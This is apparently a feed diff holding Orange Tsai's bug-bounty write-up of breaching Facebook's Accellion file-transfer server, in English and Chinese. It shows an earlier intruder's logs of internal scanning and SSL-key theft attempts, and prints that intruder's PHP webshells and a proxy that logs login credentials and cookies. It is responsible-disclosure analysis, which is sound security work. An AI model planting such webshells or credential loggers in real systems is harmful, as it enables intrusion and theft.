2&amp;gt;/dev/stdout
+...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Use ShellScript to scan internal network but forgot to redirect STDERR XD
+&lt;img src=&quot;https://lh5.googleusercontent.com/-kWigHQIuudM/VsNtaFXXiyI/AAAAAAAAA04/OoXNt7VeTcY/w1358-h732-no/6.jpg&quot; alt=&quot;Port Scanning&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Attempt to connect internal LDAP server&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;sh: -c: line 0: syntax error near unexpected token `(&amp;#39;
+sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w &amp;#39;********&amp;#39; -s base (objectclass=*) 2&amp;gt;/dev/stdout&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Attempt to access internal server &lt;br /&gt;
+(Looked like Mail OWA could be accessed directly…)&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;--20:38:09--  https://mail.thefacebook.com/
+Resolving mail.thefacebook.com... 192.168.52.37
+Connecting to mail.thefacebook.com|192.168.52.37|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://mail.thefacebook.com/owa/ [following]
+--20:38:10--  https://mail.thefacebook.com/owa/
+Reusing existing connection to mail.thefacebook.com:443.
+HTTP request sent, awaiting response... 302 Moved Temporarily
+Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0 [following]
+--20:38:10--  https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0
+Reusing existing connection to mail.thefacebook.com:443.
+HTTP request sent, awaiting response... 200 OK
+Length: 8902 (8.7K) [text/html]
+Saving to: `STDOUT&amp;#39;
+
+     0K ........                                              100% 1.17G=0s
+
+20:38:10 (1.17 GB/s) - `-&amp;#39; saved [8902/8902]
+
+--20:38:33--  (try:15)  https://10.8.151.47/
+Connecting to 10.8.151.47:443... --20:38:51--  https://svn.thefacebook.com/
+Resolving svn.thefacebook.com... failed: Name or service not known.
+--20:39:03--  https://sb-dev.thefacebook.com/
+Resolving sb-dev.thefacebook.com... failed: Name or service not known.
+failed: Connection timed out.
+Retrying.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Attempt to steal SSL Private Key&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
+mv: cannot stat `x&amp;#39;: No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+mv: cannot stat `x&amp;#39;: No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+mv: cannot stat `x&amp;#39;: No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+mv: cannot stat `x&amp;#39;: No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+mv: cannot stat `x&amp;#39;: No such file or directory
+sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
+base64: invalid input&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;After checking the browser, the SSL certificate of files.fb.com was *.fb.com …&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-tMk1LItZLMc/VsNtadzSINI/AAAAAAAAA08/RO9jDem_Iiw/w564-h511-no/7.jpg&quot; alt=&quot;certificate of files.fb.com&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h3&gt;
+
+&lt;p&gt;After adequate proofs had been collected, they were immediately reported to Facebook Security Team. Other than vulnerability details accompanying logs, screenshots and timelines were also submitted xD&lt;/p&gt;
+
+&lt;p&gt;Also, from the log on the server, there were two periods that the system was obviously operated by the hacker, one in the beginning of July and one in mid-September&lt;/p&gt;
+
+&lt;p&gt;the July one seemed to be a server “dorking” and the September one seemed more vicious. Other than server “dorking” keyloggers were also implemented. As for the identities of these two hackers, were they the same person? Your guess is as good as mine. :P&lt;br /&gt;
+The time July incident happened to take place right before the announcement of CVE-2015-2857 exploit. Whether it was an invasion of 1-day exploitation or unknown 0-day ones were left in question.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here’s the end of the story, and, generally speaking, it was a rather interesting experience xD&lt;br /&gt;
+Thanks to this event, it inspired me to write some articles about penetration :P&lt;/p&gt;
+
+&lt;p&gt;Last but not least, I would like to thank Bug Bounty and tolerant Facebook Security Team so that I could fully write down this incident : )&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;2016/02/05 20:05 Provide vulnerability details to Facebook Security Team&lt;/li&gt;
+  &lt;li&gt;2016/02/05 20:08 Receive automatic response&lt;/li&gt;
+  &lt;li&gt;2016/02/06 05:21 Submit vulnerability Advisory to Accellion Support Team&lt;/li&gt;
+  &lt;li&gt;2016/02/06 07:42 Receive response from Thomas that inspection is in progress&lt;/li&gt;
+  &lt;li&gt;2016/02/13 07:43 Receive response from Reginaldo about receiving Bug Bounty award $10000 USD&lt;/li&gt;
+  &lt;li&gt;2016/02/13 Asking if there anything I should pay special attantion to in blog post ?&lt;/li&gt;
+  &lt;li&gt;2016/02/13 Asking Is this vulnerability be classify as a RCE or SQL Injection ?&lt;/li&gt;
+  &lt;li&gt;2016/02/18 Receive response from Reginaldo about there is a forensics investigation, Would you be able to hold your blog post until this process is complete?&lt;/li&gt;
+  &lt;li&gt;2016/02/24 Receive response from Hai about the bounty will include in March payments cycle.&lt;/li&gt;
+  &lt;li&gt;2016/04/20 Receive response from Reginaldo about the forensics investigation is done&lt;/li&gt;
+&lt;/ul&gt;
+
+</content>
+ </entry>
+ 
+ <entry>
+   <title>滲透 Facebook 的思路與發現</title>
+   <link href="http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/"/>
+   <updated>2016-04-21T00:00:00+08:00</updated>
+   <id>http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script</id>
+   <content type="html">
+&lt;p&gt;by &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someone’s Backdoor Script&lt;/a&gt; (English Version)&lt;br /&gt;
+&lt;a href=&quot;http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;滲透 Facebook 的思路與發現&lt;/a&gt; (中文版本)&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://2.bp.blogspot.com/-8s6XWWiUGXU/Vxhye5uEG9I/AAAAAAAADks/XfF97zbxPTMbf1zV4nB6r3Gd75p9tEDgQCLcB/s1600/facebook.jpg&quot; alt=&quot;Facebook&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;section&quot;&gt;寫在故事之前&lt;/h3&gt;
+
+&lt;p&gt;身為一位滲透測試人員，比起 Client Side 的弱點我更喜歡 Server Side 的攻擊，能夠直接的控制伺服器、獲得權限操作 SHELL 才爽 &amp;lt;(￣︶￣)&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;當然一次完美的滲透任何形式的弱點都不可小覷，在實際滲透時偶爾還是需要些 Client Side 弱點組合可以更完美的控制伺服器，但是在尋找弱點時我本身還是先偏向以可直接進入伺服器的方式來去尋找風險高、能長驅直入的弱點。&lt;/p&gt;
+
+&lt;p&gt;隨著 Facebook 在世界上越來越火紅、用戶量越來越多，一直以來都有想要嘗試看看的想法，恰巧 Facebook 在 2012 年開始有了 &lt;a href=&quot;https://www.facebook.com/whitehat/&quot;&gt;Bug Bounty&lt;/a&gt; 獎金獵人的機制讓我更躍躍欲試。&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;一般如由滲透的角度來說習慣性都會從收集資料、偵查開始，首先界定出目標在網路上的 “範圍” 有多大，姑且可以評估一下從何處比較有機會下手。例如:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Google Hacking 到什麼資料?&lt;/li&gt;
+  &lt;li&gt;用了幾個 B 段的 IP ? C 段的 IP ?&lt;/li&gt;
+  &lt;li&gt;Whois? Reverse Whois?&lt;/li&gt;
+  &lt;li&gt;用了什麼域名? 內部使用的域名? 接著做子域名的猜測、掃描&lt;/li&gt;
+  &lt;li&gt;公司平常愛用什麼樣技術、設備?&lt;/li&gt;
+  &lt;li&gt;在 Github, Pastebin 上是否有洩漏什麼資訊?&lt;/li&gt;
+  &lt;li&gt;…etc&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;當然 Bug Bounty 並不是讓你無限制的攻擊，將所蒐集到的範圍與 Bug Bounty 所允許的範圍做交集後才是你真正可以去嘗試的目標。&lt;/p&gt;
+
+&lt;p&gt;一般來說大公司在滲透中比較容易出現的問題點這裡舉幾個例子來探討&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;對多數大公司而言，”&lt;strong&gt;網路邊界&lt;/strong&gt;” 是比較難顧及、容易出現問題的一塊，當公司規模越大，同時擁有數千、數萬台機器在線，網管很難顧及到每台機器。在攻防裡，防守要防的是一個面，但攻擊只需找個一個點就可以突破，所以防守方相對處於弱勢，攻擊者只要找到一台位於網路邊界的機器入侵進去就可以開始在內網進行滲透了!&lt;/li&gt;
+  &lt;li&gt;對於 “&lt;strong&gt;連網設備&lt;/strong&gt;” 的安全意識相對薄弱，由於連網設備通常不會提供 SHELL 給管理員做進一步的操作，只能由設備本身所提供的介面設定，所以通常對於設備的防禦都是從網路層來抵擋，但如遇到設備本身的 0-Day 或者是 1-Day 可能連被入侵了都不自覺。&lt;/li&gt;
+  &lt;li&gt;人的安全，隨著 “&lt;strong&gt;社工庫&lt;/strong&gt;” 的崛起，有時可以讓一次滲透的流程變得異常簡單，從公開資料找出公司員工列表，再從社工庫找到可以登入 VPN 的員工密碼就可以開始進行內網滲透，尤其當社工庫數量越來越多 “&lt;strong&gt;量變成質變&lt;/strong&gt;” 時只要關鍵人物的密碼在社工庫中可找到，那企業的安全性就全然突破 :P
+&lt;br /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;理所當然在尋找 Facebook 弱點時會以平常進行滲透的思路進行，在開始搜集資料時除了針對 Facebook 本身域名查詢外也對註冊信箱進行 Reverse Whois 意外發現了個奇妙的域名名稱&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;tfbnw.net
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;TFBNW 似乎是 “&lt;strong&gt;TheFacebook Network&lt;/strong&gt;” 的縮寫&lt;br /&gt;
+再藉由公開資料發現存在下面這台這台伺服器&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;vpn.tfbnw.net
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;哇! vpn.tfbnw.net 看起來是個 Juniper SSL VPN 的登入介面，不過版本滿新的沒有直接可利用的弱點，不過這也成為了進入後面故事的開端。&lt;/p&gt;
+
+&lt;p&gt;TFBNW 看似是 Facebook 內部用的域名，來掃掃 vpn.tfbnw.net 同網段看會有什麼發現&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Mail Server Outlook Web App&lt;/li&gt;
+  &lt;li&gt;F5 BIGIP SSL VPN&lt;/li&gt;
+  &lt;li&gt;CISCO ASA SSL VPN&lt;/li&gt;
+  &lt;li&gt;Oracle E-Business&lt;/li&gt;
+  &lt;li&gt;MobileIron MDM&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;從這幾台機器大致可以判斷這個網段對於 Facebook 來說應該是相對重要的網段，之後一切的故事就從這裡開始。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;section-1&quot;&gt;弱點發現&lt;/h3&gt;
+
+&lt;p&gt;在同網段中，發現一台特別的伺服器&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;files.fb.com
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-QTb-UeZgA4c/VsNtZZFa92I/AAAAAAAAA0k/zl9ckrR2aIc/w1358-h732-no/1.jpg&quot; alt=&quot;files.fb.com&quot; /&gt;
+&lt;em&gt;↑ files.fb.com 登入介面&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;從 LOGO 以及 Footer 判斷應該是 Accellion 的 Secure File Transfer (以下簡稱 FTA)&lt;/p&gt;
+
+&lt;p&gt;FTA 為一款標榜安全檔案傳輸的產品，可讓使用者線上分享、同步檔案，並整合 AD, LDAP, Kerberos 等 Single Sign-on 機制，Enterprise 版本更支援 SSL VPN 服務。&lt;/p&gt;
+
+&lt;p&gt;首先看到 FTA 的第一件事是去網路上搜尋是否有公開的 Exploit 可以利用，Exploit 最近的是由 HD Moore 發現並發佈在 Rapid7 的這篇 Advisory&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;弱點中可直接從 “&lt;strong&gt;/tws/getStatus&lt;/strong&gt;” 中洩漏的版本資訊判斷是否可利用，在發現 files.fb.com 時版本已從有漏洞的 0.18 升級至 0.20 了，不過就從 Advisory 中所透露的片段程式碼感覺 FTA 的撰寫風格如果再繼續挖掘可能還是會有問題存在的，所以這時的策略便開始往尋找 FTA 產品的 0-Day 前進!&lt;/p&gt;
+
+&lt;p&gt;不過從實際黑箱的方式其實找不出什麼問題點只好想辦法將方向轉為白箱測試，透過各種方式拿到舊版的 FTA 原始碼後終於可以開始研究了!&lt;/p&gt;
+
+&lt;p&gt;整個 FTA 產品大致架構&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;網頁端介面主要由 Perl 以及 PHP 構成&lt;/li&gt;
+  &lt;li&gt;PHP 原始碼皆經過 IonCube 加密&lt;/li&gt;
+  &lt;li&gt;在背景跑了許多 Perl 的 Daemon&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;首先是解密 IonCude 的部分，許多設備為了防止自己的產品被檢視所以會將原始碼加密，不過好在 FTA 上的 IonCude 版本沒到最新，可以使用現成的工具解密，不過由於 PHP 版本的問題，細節部份以及數值運算等可能要靠自己修復一下，不然有點難看…&lt;/p&gt;
+
+&lt;p&gt;經過簡單的原始碼審查後發現，好找的弱點應該都被 Rapid7 找走了 T^T&lt;br /&gt;
+而需要認證才能觸發的漏洞又不怎麼好用，只好認真點往深層一點的地方挖掘!&lt;/p&gt;
+
+&lt;p&gt;經過幾天的認真挖掘，最後總共發現了七個弱點，其中包含了&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
+  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
+  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
+  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;除了回報 Facebook 安全團隊外，其餘的弱點也製作成 Advisory 提交 Accellion 技術窗口，經過廠商修補提交 CERT/CC 後取得四個 CVE 編號&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;CVE-2016-2350&lt;/li&gt;
+  &lt;li&gt;CVE-2016-2351&lt;/li&gt;
+  &lt;li&gt;CVE-2016-2352&lt;/li&gt;
+  &lt;li&gt;CVE-2016-2353&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;詳細的弱點細節會待 Full Disclosure Policy 後公布!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-j0wWW746G9w/VsNtZRRFO0I/AAAAAAAAA0s/w2DWhzGEW9c/w739-h440-no/2.jpg&quot; alt=&quot;shell on facebook&quot; /&gt;
+&lt;em&gt;↑ 使用 Pre-Auth SQL Injection 寫入 Webshell&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;在實際滲透中進去伺服器後的第一件事情就是檢視當前的環境是否對自己友善，為了要讓自己可以在伺服器上待的久就要盡可能的了解伺服器上有何限制、紀錄，避開可能會被發現的風險 :P&lt;/p&gt;
+
+&lt;p&gt;Facebook 大致有以下限制:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;防火牆無法連外, TCP, UDP, 53, 80, 443 皆無法&lt;/li&gt;
+  &lt;li&gt;存在遠端的 Syslog 伺服器&lt;/li&gt;
+  &lt;li&gt;開啟 Auditd 記錄&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;無法外連看起來有點麻煩，但是 ICMP Tunnel 看似是可行的，但這只是一個 Bug Bounty Program 其實不需要太麻煩就純粹以 Webshell 操作即可。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;section-2&quot;&gt;似乎有點奇怪?&lt;/h3&gt;
+
+&lt;p&gt;正當收集證據準備回報 Facebook 安全團隊時，從網頁日誌中似乎看到一些奇怪的痕跡。&lt;/p&gt;
+
+&lt;p&gt;首先是在 “&lt;strong&gt;/var/opt/apache/php_error_log&lt;/strong&gt;” 中看到一些奇怪的 PHP 錯誤訊息，從錯誤訊息來看似乎像是邊改 Code 邊執行所產生的錯誤?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-PG1ENyW2WOQ/VsNtZZhaROI/AAAAAAAAA0o/x6hGv4HyPng/w1358-h732-no/3.jpg&quot; alt=&quot;PHP error log&quot; /&gt;
+&lt;em&gt;↑ PHP error log&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+跟隨錯誤訊息的路徑去看發現疑似前人留下的 Webshell 後門&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-2-8aZhSWGkk/VsNtZ0hOPpI/AAAAAAAAA0w/UBwhhct9Nmc/w728-h559-no/4.jpg&quot; alt=&quot;Webshell on facebook server&quot; /&gt;
+&lt;em&gt;↑ Webshell on facebook server&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;其中幾個檔案的內容如下&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;sshpass&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;沒錯，就是那個 &lt;a href=&quot;http://linux.die.net/man/1/sshpass&quot;&gt;sshpass&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;bN3d10Aw.php&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;uploader.php&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;f][&amp;quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp_name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;], basename(&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$_FILES[&amp;quot;f&amp;quot;]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[&amp;quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;])); ?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;d.php&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;include_oncce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/home/seos/courier/remote.inc&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;c&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;sclient_user_class_standard.inc&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;sclient_user_class_standard.inc.orig&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/home/seos/courier/B3dKe9sQaa0L.log&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+&lt;span class=&quot;nv&quot;&gt;$retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$max_retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
+
+&lt;span class=&quot;c1&quot;&gt;// 省略...&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Y-m-d H:i:s T&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;REMOTE_ADDR&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;HTTP_USER_AGENT&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;POST=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;GET=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;COOKIE=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+
+&lt;span class=&quot;c1&quot;&gt;// 省略...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;前幾個就是很標準的 PHP 一句話木馬&lt;br /&gt;
+其中比較特別的是 “&lt;strong&gt;sclient_user_class_standard.inc&lt;/strong&gt;” 這個檔案&lt;/p&gt;
+
+&lt;p&gt;include_once 中 “&lt;strong&gt;sclient_user_class_standard.inc.orig&lt;/strong&gt;” 為原本對密碼進行驗證的 PHP 程式，駭客做了一個 Proxy 在中間並在進行一些重要操作時先把 GET, POST, COOKIE 的值記錄起來&lt;/p&gt;
+
